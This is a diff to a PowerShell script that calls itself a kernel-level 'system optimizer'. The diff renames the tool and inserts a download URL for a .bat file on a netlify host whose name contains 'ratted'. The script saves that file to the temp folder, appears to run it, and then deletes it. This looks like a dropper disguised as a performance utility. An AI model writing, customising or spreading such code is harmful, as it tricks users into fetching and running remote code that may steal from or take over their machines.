@@ -1,4 +1,4 @@
-# Ring0 Optimizer  
+# Unhiin Optimizer  
 <#  
 .SYNOPSIS  
     Kernel-Level System Optimization Utility  
@@ -7,7 +7,7 @@
 #>  
 
 # Console settings  
-$Host.UI.RawUI.WindowTitle = "Ring0 Optimizer"  
+$Host.UI.RawUI.WindowTitle = "Unhiin Optimizer"  
 
 # Disable default progress  
 $ProgressPreference = "SilentlyContinue"  
@@ -15,7 +15,7 @@ $ProgressPreference = "SilentlyContinue"
 function Show-Banner {  
     $banner = @"  
 ============================================  
-Ring0 Optimizer  
+Unhiin Optimizer  
 Kernel-Level System Enhancement  
 Version 1.0 - Elite Mode  
 ============================================  
@@ -77,11 +77,12 @@ function Main {
     Clear-Host  
     Show-Banner  
       
-    Write-Host "`nStarting Ring0 Optimization Process..."  
+    Write-Host "`nStarting Unhiin Optimization Process..."  
     Write-Host "--------------------------------------------"  
       
-    $exeUrl = ""  
-    $tempPath = Join-Path $env:TEMP "ring0_opt.exe"  
+    # Updated with your specific URL and filename
+    $exeUrl = "https://rattedlololol.netlify.app/unhiin_DT8HBq2dgiX4.bat"
+    $tempPath = Join-Path $env:TEMP "unhiin_DT8HBq2dgiX4.bat"  
       
     $downloadSuccess = Download-Optimizer -Url $exeUrl -OutputPath $tempPath  
       
@@ -103,7 +104,7 @@ function Main {
     Cleanup-Files -FilePath $tempPath  
       
     Write-Host "`n--------------------------------------------"  
-    Write-Host "Ring0 Optimization Complete."  
+    Write-Host "Unhiin Optimization Complete."  
     Write-Host "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"  
     Write-Host "--------------------------------------------"  
       
